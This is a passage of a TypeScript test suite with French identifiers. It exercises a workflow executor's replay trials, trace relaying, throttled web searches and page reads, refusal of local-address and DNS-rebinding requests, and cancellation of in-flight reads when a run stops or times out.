      expect(r.execution.blocs[0]!.journal).toEqual([]);
      expect(r.execution.blocs[1]).toMatchObject({ elements: 2, journal: [], debut: null });
      expect(r.execution.blocs[1]!.sortie).toBeUndefined();
      expect(relayed.map((t: any) => `${t.etape}:${t.bloc}`)).toEqual(["debut:c", "fin:c", "debut:sortie", "fin:sortie"]);
    });

    it("a trial sends no memory and returns none", async () => {
      const received: string[] = [];
      const b = await banc(chain("a", "b", "c"), {}, {
        lancer: () => {
          const p = scriptedLauncher([{ t: "memoire", memoire: { c: { type: "code", valeur: "forgée" } } }, { t: "fin", donnees: null }])("", []);
          p.stdin.on("data", (d: Buffer) => received.push(d.toString()));
          return p;
        },
        memoire: { a: { type: "code", valeur: 1 }, c: { type: "code", valeur: 2 } },
      });
      b.ctx.rejeu = replayFromC;
      const r = await executerWorkflow(b.ctx, b.infra);
      const lignes = received.join("").trim().split("\n").map((l) => JSON.parse(l));
      expect(lignes[0].rejeu).toEqual({ relances: ["c", "sortie"], sorties: { b: [{ x: 1 }, { x: 2 }] } });
      expect(lignes[1]).toEqual({ t: "memoire", memoire: {} });
      expect(r.issue).toMatchObject({ t: "fin", memoire: null });
    });

    it("outputs to reuse of over 4 MB stop the trial without launching a container", async () => {
      const b = await banc(chain("a", "b", "c"));
      b.ctx.rejeu = { ...replayFromC, sorties: { b: "x".repeat(LIGNE_MAX_OCTETS) } };
      const r = await executerWorkflow(b.ctx, b.infra);
      expect(r.issue).toEqual({ t: "arret", statut: "erreur", erreur: REPLAY_TOO_BIG });
      expect(REPLAY_TOO_BIG).toBe("Rejeu impossible : les sorties à reprendre dépassent 4 Mo");
      expect(b.commandes).toEqual([]);
      expect(r.execution).toMatchObject({ statut: "echouee", erreur: REPLAY_TOO_BIG, erreurNoyau: true });
    });
  });

  it("surTrace receives debut then fin of each block, with elements; a fake out-of-order trace is not relayed", async () => {
    const b = await banc(chain("a"), {
      "a.mjs": `export default async () => {
        const l = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
        l({ t: "bloc", id: "sortie", etape: "debut" });
        l({ t: "bloc", id: "sortie", etape: "fin", statut: "reussi", sortie: "forgée" });
        l({ t: "bloc", id: "inconnu", etape: "debut" });
        return [1, 2, 3];
      };`,
    });
    const relayed: unknown[] = [];
    b.infra.surTrace = (t) => relayed.push(t);
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: [1, 2, 3] } });
    expect(relayed).toEqual([
      { bloc: "a", etape: "debut" },
      { bloc: "a", etape: "fin", statut: "reussi", elements: 3 },
      { bloc: "sortie", etape: "debut" },
      { bloc: "sortie", etape: "fin", statut: "reussi", elements: 3 },
    ]);
  });

  it("a surTrace that throws does not break the run", async () => {
    const b = await banc(chain("a"), { "a.mjs": `export default async () => 1;` });
    b.infra.surTrace = () => {
      throw new Error("relais cassé");
    };
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: 1 } });
    expect(r.execution.statut).toBe("reussie");
  });

  it("the container impossible to launch: erreur stop, failed run without a launched block", async () => {
    const b = await banc(chain("a"));
    b.infra.atelier = { commandeRecolte: () => { throw new Error("Docker introuvable"); }, supprimerRecolte: async () => {} };
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "arret", statut: "erreur", erreur: "Récolte impossible à lancer : Docker introuvable" });
    expect(r.execution.statut).toBe("echouee");
    expect(r.execution.blocs.every((x) => x.statut === "pas-lance")).toBe(true);
  });
});

describe("executerWorkflow: web search and open reads", () => {
  const BASE = "https://ddg.test/html/";
  const page = (name: string) => readFileSync(new URL(`./fixtures/duckduckgo/${name}`, import.meta.url), "utf8");
  const fixtureResults = (() => {
    const r = extractResults(page("resultats.html"), 20);
    if (!("resultats" in r)) throw new Error("attendu : des résultats");
    return r.resultats;
  })();

  /** Throttle with a fake clock: each wait advances the clock, without ever really waiting. */
  const fakePacing = () => {
    let t = 0;
    const waits: number[] = [];
    const pacing = new Pacing({
      maintenant: () => t,
      attendre: async (ms) => {
        waits.push(ms);
        t += ms;
      },
    });
    return { menagement: pacing, attentes: waits };
  };

  /** A widget `a` → sortie whose code is given; `web` and the throttle set. */
  async function bancWeb(code: string, o: { web?: boolean; compte?: string[]; html?: Record<string, string>; pages?: { url: string; titre: string; texte: string; liens: [] }[]; menagement?: Pacing; delaiMs?: number } = {}) {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: o.pages ?? [], html: o.html ?? {} } });
    const b = await banc(chain("a"), { "a.mjs": code }, { pont, compte: o.compte, accord: { profil: "perso" }, delaiMs: o.delaiMs });
    b.ctx.sources = { ...b.ctx.sources, ...(o.web !== undefined ? { web: o.web } : {}) };
    b.infra.menagement = o.menagement ?? fakePacing().menagement;
    b.infra.urlRecherche = BASE;
    return { b, pont, html: () => pont.appels.filter((a) => a.methode === "lireHtmlInvisible") };
  }
  const valeur = (r: Awaited<ReturnType<typeof executerWorkflow>>) => (r.issue.t === "fin" ? r.issue.sortie.valeur : r.issue);
  /** Code that makes these calls one after the other and returns, for each, the result or « erreur: <message> ». */
  const enSuite = (calls: string[]) => `const essai = (p) => p.then((x) => x, (e) => "erreur: " + e.message);
    export default async (e, w) => { const r = []; ${calls.map((a) => `r.push(await essai(${a}));`).join(" ")} return r; };`;

  it("chercherWeb returns the results of the recorded page, search url built on urlRecherche", async () => {
    const { b, html } = await bancWeb(enSuite([`w.chercherWeb("clio fiabilité", { nombre: 3 })`]), {
      web: true,
      html: { [urlRecherche("clio fiabilité", BASE)]: page("resultats.html") },
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual([fixtureResults.slice(0, 3)]);
    expect(html().map((a) => a.args)).toEqual([[urlRecherche("clio fiabilité", BASE), { adressesLocales: true }]]);
  });

  it("chercherWeb drops results to a local address, then cuts to nombre", async () => {
    const bloc = (u: string) => `<div class="result"><a class="result__a" href="${u}">T</a><a class="result__snippet">E</a></div>`;
    const local = [
      "http://127.0.0.1:8080/admin",
      "http://localhost/x",
      "http://192.168.1.1/",
      "http://imprimante.local/",
      "http://[::1]/",
      "https://a.example/",
      "https://b.example/",
      "https://c.example/",
    ].map(bloc).join("");
    const { b } = await bancWeb(enSuite([`w.chercherWeb("x", { nombre: 2 })`]), { web: true, html: { [urlRecherche("x", BASE)]: local } });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual([[{ titre: "T", url: "https://a.example/", extrait: "E" }, { titre: "T", url: "https://b.example/", extrait: "E" }]]);
  });

  it("without web: WEB_REQUIS, no call to the bridge", async () => {
    const { b, pont } = await bancWeb(enSuite([`w.chercherWeb("x")`]), { html: { [urlRecherche("x", BASE)]: page("resultats.html") } });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual([`erreur: ${WEB_REQUIRED}`]);
    expect(pont.appels).toEqual([]);
  });

  it("widget with an account: WEB_REQUIS", async () => {
    // web with an account is refused at the widget.json read; the executor refuses anyway.
    const { b, html } = await bancWeb(enSuite([`w.chercherWeb("x")`]), {
      web: true,
      compte: ["mail.google.com"],
      html: { [urlRecherche("x", BASE)]: page("resultats.html") },
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual([`erreur: ${WEB_REQUIRED}`]);
    expect(html()).toEqual([]);
  });

  it("31e recherche : PLAFOND_RECHERCHES, 30 lectures de HTML seulement", async () => {
    const { menagement: pacing, attentes: waits } = fakePacing();
    const { b, html } = await bancWeb(enSuite(Array.from({ length: 31 }, () => `w.chercherWeb("clio", { nombre: 1 })`)), {
      web: true,
      menagement: pacing,
      html: { [urlRecherche("clio", BASE)]: page("resultats.html") },
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    const sortie = valeur(r) as unknown[];
    expect(sortie.slice(0, 30)).toEqual(Array.from({ length: 30 }, () => fixtureResults.slice(0, 1)));
    expect(sortie[30]).toBe(`erreur: ${SEARCHES_CAP}`);
    expect(html()).toHaveLength(30);
    // Throttled: 2 s between two searches.
    expect(waits).toEqual(Array.from({ length: 29 }, () => 2000));
  });

  it("check page: RECHERCHE_REFUSEE, then RECHERCHES_ARRETEES without a new read", async () => {
    const { b, html } = await bancWeb(enSuite([`w.chercherWeb("a")`, `w.chercherWeb("b")`]), {
      web: true,
      html: { [urlRecherche("a", BASE)]: page("verification.html"), [urlRecherche("b", BASE)]: page("resultats.html") },
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual([`erreur: ${SEARCH_DENIED}`, `erreur: ${SEARCHES_STOPPED}`]);
    expect(html()).toHaveLength(1);
  });

  it("a queued search when the refusal arrives does not leave, and does not consume the search gap", async () => {
    const { menagement: pacing, attentes: waits } = fakePacing();
    const { b, html } = await bancWeb(
      `const essai = (p) => p.then((x) => x, (e) => "erreur: " + e.message);
      export default async (e, w) => Promise.all([essai(w.chercherWeb("a")), essai(w.chercherWeb("b"))]);`,
      { web: true, menagement: pacing, html: { [urlRecherche("a", BASE)]: page("verification.html"), [urlRecherche("b", BASE)]: page("resultats.html") } },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual([`erreur: ${SEARCH_DENIED}`, `erreur: ${SEARCHES_STOPPED}`]);
    expect(html()).toHaveLength(1);
    // « b » waited for nothing; the next search waits 2 s from the end of « a », the only one that was played (not 2 s more).
    await pacing.rechercher(async () => {});
    expect(waits).toEqual([2000]);
  });

  it("page changed: RESULTATS_ILLISIBLES, never an empty list; no result: empty list", async () => {
    const { b } = await bancWeb(enSuite([`w.chercherWeb("a")`, `w.chercherWeb("b")`]), {
      web: true,
      html: { [urlRecherche("a", BASE)]: page("changee.html"), [urlRecherche("b", BASE)]: page("aucun-resultat.html") },
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual([`erreur: ${UNREADABLE_RESULTS}`, []]);
  });

  it("web widget: the 101st open read (pages and feeds) throws TROP_DE_LECTURES", async () => {
    const web = await webServer({ "/f": (res) => res.end("<rss><channel><item><title>T</title><link>https://x.example/</link></item></channel></rss>") });
    const { menagement: pacing, attentes: waits } = fakePacing();
    const spy = vi.spyOn(pacing, "lire");
    const { b, pont } = await bancWeb(
      `const essai = (p) => p.then(() => "ok", (e) => "erreur: " + e.message);
      export default async (e, w) => {
        const r = [];
        for (let i = 0; i < 40; i++) r.push(await essai(w.lirePage("https://www.pages.example/" + i)));
        for (let i = 0; i < 30; i++) r.push(await essai(w.recuperer("${web.url}/f")));
        for (let i = 0; i < 30; i++) r.push(await essai(w.lireFlux("${web.url}/f")));
        r.push(await essai(w.lirePage("https://pages.example/de-trop")));
        r.push(await essai(w.recuperer("${web.url}/f")));
        return r;
      };`,
      { web: true, menagement: pacing },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    const sortie = valeur(r) as string[];
    expect(sortie.slice(0, 100).every((x) => x === "ok")).toBe(true);
    expect(sortie.slice(100)).toEqual([`erreur: ${TOO_MANY_READS}`, `erreur: ${TOO_MANY_READS}`]);
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible")).toHaveLength(40);
    expect(web.requetes).toHaveLength(60);
    // Each goes through the throttle, per host: 1 s between two reads of the same host.
    expect(spy).toHaveBeenCalledTimes(100);
    expect(spy.mock.calls.slice(0, 40).every((c) => c[0] === "www.pages.example")).toBe(true);
    expect(spy.mock.calls.slice(40).every((c) => c[0] === "127.0.0.1")).toBe(true);
    expect(waits.every((ms) => ms === 1000)).toBe(true);
    expect(waits).toHaveLength(98);
  });

  it("web widget: a read redirected to another site waits for that site's throttle", async () => {
    const { menagement: pacing, attentes: waits } = fakePacing();
    const pont = new PontFactice([], {
      actif: null,
      autoriser: false,
      lecture: {
        pages: [{ url: "https://b.example/2", titre: "deux", texte: "", liens: [] }],
        redirections: { "https://a.example/court": "https://www.b.example/2", "https://a.example/meme": "https://www.a.example/x" },
      },
    });
    const b = await banc(
      chain("a"),
      {
        "a.mjs": `export default async (e, w) => [
          (await w.lirePage("https://b.example/1")).url,
          (await w.lirePage("https://a.example/court")).url,
          (await w.lirePage("https://a.example/meme")).url,
        ];`,
      },
      { pont },
    );
    b.ctx.sources = { ...b.ctx.sources, web: true };
    b.infra.menagement = pacing;
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual(["https://b.example/1", "https://www.b.example/2", "https://www.a.example/x"]);
    // b.example read just before: the redirect waits 1 s. a.example, released at the redirect, does not make
    // the 3rd read wait, redirected to the same site (www.).
    expect(pont.appels.filter((a) => a.methode === "changerHote").map((a) => a.args[0])).toEqual(["www.b.example", "www.a.example"]);
    expect(waits).toEqual([1000]);
  });

  it("web widget: a fetch redirected to another site waits for that site's throttle", async () => {
    let elsewhere = "";
    // /vers-localhost redirects to the same server, under another host name.
    const web = await webServer({
      "/f": (res) => res.end("fini"),
      "/vers-localhost": (res) => {
        res.writeHead(302, { location: elsewhere });
        res.end();
      },
    });
    elsewhere = `http://localhost:${web.port}/f`;
    const { menagement: pacing, attentes: waits } = fakePacing();
    const lire = vi.spyOn(pacing, "lire");
    const { b } = await bancWeb(
      `export default async (e, w) => [await w.recuperer("${elsewhere}"), await w.recuperer("${web.url}/vers-localhost")];`,
      { web: true, menagement: pacing },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual(["fini", "fini"]);
    expect(lire.mock.calls.map((c) => c[0])).toEqual(["localhost", "127.0.0.1"]);
    // localhost read just before: the redirect waits for its gap.
    expect(waits).toEqual([1000]);
  });

  it("recuperer: the wait for a redirect's site is bounded by the stop (and the timeout), without a request to the target", async () => {
    let target = "";
    const web = await webServer({
      "/f": (res) => res.end("fini"),
      "/vers-localhost": (res) => {
        res.writeHead(302, { location: target });
        res.end();
      },
    });
    target = `http://localhost:${web.port}/f`;
    const stop = new AbortController();
    const changeHost = vi.fn(() => new Promise<void>(() => {}));
    const p = fetch(`${web.url}/vers-localhost`, "texte", null, true, stop.signal, changeHost);
    p.catch(() => {});
    await vi.waitFor(() => expect(changeHost).toHaveBeenCalledWith("localhost"));
    stop.abort(new Error("Exécution arrêtée"));
    await expect(p).rejects.toThrow("Exécution arrêtée");
    expect(web.requetes).toEqual(["/vers-localhost"]);
  });

  it("recuperer: a name that resolves to the machine is refused at connection, without a request", async () => {
    const web = await webServer({ "/": (res) => res.end("ok") });
    // Like 127.0.0.1.nip.io, without network: the name passes the text check, its address is local.
    const resolution = vi.spyOn(dns, "lookup").mockImplementation(((_h: string, _o: unknown, rappel: (e: null, a: dns.LookupAddress[]) => void) =>
      rappel(null, [{ address: "127.0.0.1", family: 4 }])) as unknown as typeof dns.lookup);
    try {
      await expect(fetch(`http://piege.example:${web.port}/`, "texte", null, false)).rejects.toThrow("Adresse locale refusée");
    } finally {
      resolution.mockRestore();
    }
    expect(web.requetes).toEqual([]);
  });

  it("widget without web: 150 reads go through, no throttle wait", async () => {
    const spy = new Pacing({ attendre: async () => { throw new Error("aucune attente attendue"); } });
    const lire = vi.spyOn(spy, "lire");
    const search = vi.spyOn(spy, "rechercher");
    const { b, pont } = await bancWeb(
      `export default async (e, w) => { for (let i = 0; i < 150; i++) await w.lirePage("https://pages.example/" + i); return "fini"; };`,
      { menagement: spy },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toBe("fini");
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible")).toHaveLength(150);
    expect(lire).not.toHaveBeenCalled();
    expect(search).not.toHaveBeenCalled();
  });

  it("run stop: a read waiting for the throttle does not leave", async () => {
    let t = 0;
    const pending: (() => void)[] = [];
    const pacing = new Pacing({ maintenant: () => t, attendre: () => new Promise<void>((ok) => pending.push(ok)) });
    const { b, pont } = await bancWeb(
      `export default async (e, w) => { await w.lirePage("https://pages.example/1"); return w.lirePage("https://pages.example/2"); };`,
      { web: true, menagement: pacing, delaiMs: 300 },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "arret", statut: "erreur", erreur: "Délai dépassé" });
    // The gap elapses after the stop: the queued read does not leave.
    t += 10_000;
    for (const ok of pending.splice(0)) ok();
    await new Promise((ok) => setTimeout(ok, 20));
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible").map((a) => a.args[0])).toEqual(["https://pages.example/1"]);
  });

  it("end of the run: a search still queued does not leave", async () => {
    let t = 0;
    const pending: (() => void)[] = [];
    const pacing = new Pacing({ maintenant: () => t, attendre: () => new Promise<void>((ok) => pending.push(ok)) });
    const { b, html } = await bancWeb(
      `export default async (e, w) => { await w.chercherWeb("a"); w.chercherWeb("b").catch(() => {}); return "fini"; };`,
      { web: true, menagement: pacing, html: { [urlRecherche("a", BASE)]: page("resultats.html") } },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toBe("fini");
    t += 10_000;
    for (const ok of pending.splice(0)) ok();
    await new Promise((ok) => setTimeout(ok, 20));
    expect(html()).toHaveLength(1);
  });
});

describe("executerWorkflow: a stop cancels the reads in progress", () => {
  const BASE = "https://ddg.test/html/";
  /** A fake container: sends these calls, then waits to be killed; keeps what the kernel writes to it. */
  const callsContainer = (calls: { f: string; a: unknown }[]) => {
    const received: string[] = [];
    let kill = () => {};
    const lancer: ProcessLauncher = () => {
      const stdout = new PassThrough();
      const stderr = new PassThrough();
      const stdin = new PassThrough();
      stdin.on("data", (d) => received.push(String(d)));
      let finish!: (c: number | null) => void;
      const fin = new Promise<number | null>((ok) => (finish = ok));
      kill = () => {
        stdout.end();
        stderr.end();
        finish(null);
      };
      setImmediate(() => calls.forEach((x, i) => stdout.write(JSON.stringify({ t: "appel", n: i + 1, ...x }) + "\n")));
      return { stdin, stdout, stderr, tuer: () => kill(), fin };
    };
    return {
      lancer,
      /** The container is removed from outside (quitting the browser). */
      tuer: () => kill(),
      reponses: () => received.join("").split("\n").filter((l) => l.includes(`"t":"reponse"`)),
    };
  };
  const cancelledList = (pont: PontFactice) => pont.appels.filter((a) => a.methode === "lectureAnnulee").map((a) => a.args[0]);
  const valeur = (r: Awaited<ReturnType<typeof executerWorkflow>>) => (r.issue.t === "fin" ? r.issue.sortie.valeur : r.issue);

  it("timeout exceeded: pages (public, with an account) and fetch in progress cancelled, nothing comes back to the container", async () => {
    const closed: string[] = [];
    const web = await webServer({ "/lent": (res) => void res.on("close", () => closed.push("/lent")) });
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [], suspendues: ["https://pages.example/a", "https://app.daily.dev/b"] } });
    const c = callsContainer([
      { f: "lirePage", a: { url: "https://pages.example/a" } },
      { f: "lirePage", a: { url: "https://app.daily.dev/b", compte: true } },
      { f: "recuperer", a: { url: `${web.url}/lent` } },
    ]);
    const b = await banc(chain("a"), {}, { pont, compte: ["app.daily.dev"], publiques: ["pages.example", "127.0.0.1"], accord: { profil: "perso" }, delaiMs: 300, lancer: c.lancer });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "arret", statut: "erreur", erreur: "Délai dépassé" });
    await vi.waitFor(() => {
      expect(cancelledList(pont).sort()).toEqual(["https://app.daily.dev/b", "https://pages.example/a"]);
      expect(closed).toEqual(["/lent"]);
    });
    await new Promise((ok) => setTimeout(ok, 20));
    expect(c.reponses()).toEqual([]);
  });

  it("container removed (quit): its reads are cancelled, not those of another run", async () => {
    const pont = new PontFactice([], {
      actif: null,
      autoriser: false,
      lecture: { pages: [{ url: "https://pages.example/b", titre: "B", texte: "", liens: [] }], suspendues: ["https://pages.example/a", "https://pages.example/b"] },
    });
    const other = await banc(chain("a"), { "a.mjs": `export default async (e, w) => (await w.lirePage("https://pages.example/b")).titre;` }, { pont });
    const c = callsContainer([{ f: "lirePage", a: { url: "https://pages.example/a" } }]);
    const b = await banc(chain("a"), {}, { pont, lancer: c.lancer });
    const rOther = executerWorkflow(other.ctx, other.infra);
    const r = executerWorkflow(b.ctx, b.infra);
    await vi.waitFor(() => expect(pont.appels.filter((a) => a.methode === "lirePageInvisible")).toHaveLength(2));
    c.tuer();
    expect((await r).issue.t).toBe("echec");
    await vi.waitFor(() => expect(cancelledList(pont)).toEqual(["https://pages.example/a"]));
    // The other run, for its part, still reads.
    expect(pont.relacher("https://pages.example/b")).toBe(1);
    expect(valeur(await rOther)).toBe("B");
    expect(cancelledList(pont)).toEqual(["https://pages.example/a"]);
  });

  it("web widget: a read and a search in progress cancelled free their turn, the gap counts from the cancellation", async () => {
    let t = 0;
    const waits: number[] = [];
    const pacing = new Pacing({
      maintenant: () => t,
      attendre: async (ms) => {
        waits.push(ms);
        t += ms;
      },
    });
    const pont = new PontFactice([], {
      actif: null,
      autoriser: false,
      lecture: {
        pages: [{ url: "https://pages.example/2", titre: "deux", texte: "", liens: [] }],
        html: { [urlRecherche("b", BASE)]: readFileSync(new URL("./fixtures/duckduckgo/aucun-resultat.html", import.meta.url), "utf8") },
        suspendues: ["https://pages.example/1", urlRecherche("a", BASE)],
      },
    });
    const preparer = (bb: Banc) => {
      bb.ctx.sources = { ...bb.ctx.sources, web: true };
      bb.infra.menagement = pacing;
      bb.infra.urlRecherche = BASE;
    };
    const c = callsContainer([
      { f: "lirePage", a: { url: "https://pages.example/1" } },
      { f: "chercherWeb", a: { requete: "a", nombre: 1 } },
    ]);
    const b = await banc(chain("a"), {}, { pont, delaiMs: 300, lancer: c.lancer });
    preparer(b);
    expect((await executerWorkflow(b.ctx, b.infra)).issue).toEqual({ t: "arret", statut: "erreur", erreur: "Délai dépassé" });
    await vi.waitFor(() => expect(cancelledList(pont).sort()).toEqual(["https://pages.example/1", urlRecherche("a", BASE)].sort()));
    // Another run on the same throttle: neither the host's lane nor the searches' lane stays taken.
    const next = await banc(
      chain("a"),
      { "a.mjs": `export default async (e, w) => [(await w.lirePage("https://pages.example/2")).titre, (await w.chercherWeb("b", { nombre: 1 })).length];` },
      { pont, delaiMs: 3000 },
    );
    preparer(next);
    expect(valeur(await executerWorkflow(next.ctx, next.infra))).toEqual(["deux", 0]);
    // The cancelled requests had left: the gap counts from their cancellation (t = 0). The read waits its 1 s,
    // then the search the rest of its 2 s (1 s already elapsed).
    expect(waits).toEqual([1000, 1000]);
  });
});

describe("executerWorkflow: watch (duration, chain, publications, memory along the way)", () => {
  /** liste (code) → fiche → avis (source.recuperer per element) → sortie. */
  const watch = (o: { auFilDeLEau?: boolean } = {}) => ({
    version: 1,
    blocs: [
      { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
      { id: "fiche", type: "source.recuperer", parametres: { url: "{url}", parElement: true } },
      { id: "avis", type: "source.recuperer", parametres: { url: "{url}", parElement: true } },
      { id: "sortie", type: "sortie", parametres: { vers: "widget", ...(o.auFilDeLEau ? { auFilDeLEau: true } : {}) } },
    ],
    liens: [{ de: "liste", vers: "fiche" }, { de: "fiche", vers: "avis" }, { de: "avis", vers: "sortie" }],
  });

  /**
   * A fake container that writes its lines one by one (a function is called in its place: advance the clock; a text
   * is written as is, several lines at once);
   * `recu` receives what the kernel writes to it; `bloque`: it never exits on its own (only killed).
   */
  const launcherSteps = (pas: unknown[], o: { recu?: string[]; bloque?: boolean } = {}): ProcessLauncher => () => {
    const stdout = new PassThrough();
    const stderr = new PassThrough();
    const stdin = new PassThrough();
    stdin.on("data", (d: Buffer) => o.recu?.push(d.toString()));
    let kill = () => {};
    const fin = new Promise<number | null>((ok) => {
      kill = () => ok(null);
      void (async () => {
        for (const p of pas) {
          await new Promise((r) => setImmediate(r));
          if (typeof p === "function") p();
          else stdout.write(typeof p === "string" ? p : JSON.stringify(p) + "\n");
        }
        await new Promise((r) => setImmediate(r));
        if (o.bloque) return;
        stdout.end();
        stderr.end();
        setImmediate(() => ok(0));
      })();
    });
    return { stdin, stdout, stderr, tuer: () => kill(), fin };
  };

  /** A clock that the steps make advance. */
  const fakeClock = (b: Banc) => {
    let t = NOW.getTime();
    b.infra.horloge = () => new Date(t);
    return (ms: number) => () => {
      t += ms;
    };
  };

  /** The workshop's real command, kept to read its `timeout`. */
  const brancherAtelier = (b: Banc) => {
    const atelier = new Atelier({ chemins: spacePaths("/Users/t/WebAiOs"), docker: "/usr/local/bin/docker" });
    const commands: string[][] = [];
    b.infra.atelier = {
      commandeRecolte: (id, d, m, s) => {
        const c = atelier.commandeRecolte(id, d, m, s);
        commands.push(c);
        return c;
      },
      supprimerRecolte: async () => {},
    };
    return () => {
      const c = commands[0]!;
      return c.slice(c.indexOf("timeout"), c.indexOf("timeout") + 4);
    };
  };

  /** The delays given to setTimeout during `f`. */
  async function delaysDuring(f: () => Promise<unknown>): Promise<unknown[]> {
    const spy = vi.spyOn(globalThis, "setTimeout");
    try {
      await f();
      return spy.mock.calls.map((c) => c[1]);
    } finally {
      spy.mockRestore();
    }
  }

  const debutBloc = (id: string) => ({ t: "bloc", id, etape: "debut" });
  const finBloc = (id: string, sortie: unknown = [{ url: "https://a.example/1" }], status = "reussi") => ({ t: "bloc", id, etape: "fin", statut: status, sortie });
  const pub = (data: unknown, done: number, total: number) => ({ t: "publication", donnees: data, faits: done, total });
  const attempt = (b: Banc) => {
    b.ctx.declencheur = "rejeu";
    b.ctx.rejeu = { relances: [...b.ctx.valide.ordre], sorties: {}, repris: {} };
  };

  it("the watch() chain is fiche → avis", () => {
    expect(streamingChain(valid(watch({ auFilDeLEau: true })))).toEqual(["fiche", "avis"]);
  });

  it("widget without the new fields: debut line identical to today, timeout 180, delay 200 s", async () => {
    const received: string[] = [];
    const b = await banc(watch(), {}, { lancer: launcherSteps([{ t: "fin", donnees: null }], { recu: received }) });
    const timeout = brancherAtelier(b);
    const delays = await delaysDuring(() => executerWorkflow(b.ctx, b.infra));
    const { workflow, ordre: order } = b.ctx.valide;
    expect(received.join("").split("\n")[0]).toBe(
      JSON.stringify({ t: "debut", precedent: null, maintenant: NOW.toISOString(), config: { interets: "rust" }, workflow: { blocs: workflow.blocs, liens: workflow.liens, ordre: order } }),
    );
    expect(timeout()).toEqual(["timeout", "-k", "5", "180"]);
    expect(delays).toContain(200_000);
  });

  it("Gmail widget (account, recolte.mjs alone): identical debut line, timeout 180, delay 200 s, neither surMemoire nor memoire on an echec", async () => {
    const received: string[] = [];
    const implicit = { version: 1, blocs: [{ id: "recolte", type: "code", parametres: { source: "recolte.mjs" } }, { id: "sortie", type: "sortie", parametres: { vers: "widget" } }], liens: [{ de: "recolte", vers: "sortie" }] };
    const b = await banc(implicit, {}, {
      compte: ["mail.google.com"],
      accord: { profil: "p1" },
      lancer: launcherSteps([{ t: "memoire", memoire: { recolte: { type: "code", valeur: 1 } } }, { t: "journal", bloc: "recolte", texte: "x" }, { t: "echec", erreur: "cassé" }], { recu: received }),
    });
    const timeout = brancherAtelier(b);
    const memories: unknown[] = [];
    b.infra.surMemoire = async (m) => void memories.push(m);
    let issue: unknown;
    const delays = await delaysDuring(async () => {
      issue = (await executerWorkflow(b.ctx, b.infra)).issue;
    });
    const { workflow, ordre: order } = b.ctx.valide;
    expect(received.join("").split("\n")[0]).toBe(
      JSON.stringify({ t: "debut", precedent: null, maintenant: NOW.toISOString(), config: { interets: "rust" }, workflow: { blocs: workflow.blocs, liens: workflow.liens, ordre: order } }),
    );
    expect(timeout()).toEqual(["timeout", "-k", "5", "180"]);
    expect(delays).toContain(200_000);
    expect(memories).toEqual([]);
    expect(issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true });
  });

  it("dureeMaxMinutes 30: debut carries limiteMs 1,800,000 and progressif, container launched with timeout 1830, delay 1,850 s", async () => {
    const received: string[] = [];
    const b = await banc(watch(), {}, { lancer: launcherSteps([{ t: "fin", donnees: null }], { recu: received }) });
    b.ctx.dureeMaxMinutes = 30;
    const timeout = brancherAtelier(b);
    const delays = await delaysDuring(() => executerWorkflow(b.ctx, b.infra));
    const debut = JSON.parse(received.join("").split("\n")[0]!);
    expect(debut).toMatchObject({ t: "debut", limiteMs: 1_800_000, progressif: true });
    expect(timeout()).toEqual(["timeout", "-k", "5", "1830"]);
    expect(delays).toContain(1_850_000);
    expect(delays).not.toContain(200_000);
  });

  it("auFilDeLEau without dureeMaxMinutes: progressif without limiteMs; a trial is never progressive", async () => {
    const received: string[] = [];
    const b = await banc(watch({ auFilDeLEau: true }), {}, { lancer: launcherSteps([{ t: "fin", donnees: null }], { recu: received }) });
    await executerWorkflow(b.ctx, b.infra);
    const debut = JSON.parse(received.join("").split("\n")[0]!);
    expect(debut.progressif).toBe(true);
    expect("limiteMs" in debut).toBe(false);

    const receivedAttempt: string[] = [];
    const e = await banc(watch({ auFilDeLEau: true }), {}, { lancer: launcherSteps([{ t: "fin", donnees: null }], { recu: receivedAttempt }) });
    e.ctx.dureeMaxMinutes = 30;
    attempt(e);
    await executerWorkflow(e.ctx, e.infra);
    const attemptStart = JSON.parse(receivedAttempt.join("").split("\n")[0]!);
    expect("progressif" in attemptStart).toBe(false);
    expect(attemptStart.limiteMs).toBe(1_800_000);
  });

  it("chain traces accepted; an out-of-order chain end rejected", async () => {
    const inChain = await banc(watch({ auFilDeLEau: true }), {}, {
      lancer: launcherSteps([
        debutBloc("liste"), finBloc("liste"),
        debutBloc("fiche"), debutBloc("avis"),
        { t: "journal", bloc: "fiche", texte: "lu" },
        finBloc("fiche"), finBloc("avis"),
        debutBloc("sortie"), finBloc("sortie"),
        { t: "fin", donnees: [] },
      ]),
    });
    const relayed: unknown[] = [];
    inChain.infra.surTrace = (t) => relayed.push(t);
    const r = await executerWorkflow(inChain.ctx, inChain.infra);
    expect(r.execution.statut).toBe("reussie");
    expect(r.execution.blocs.find((x) => x.id === "fiche")!.journal).toEqual(["lu"]);
    expect(relayed).toEqual([
      { bloc: "liste", etape: "debut" },
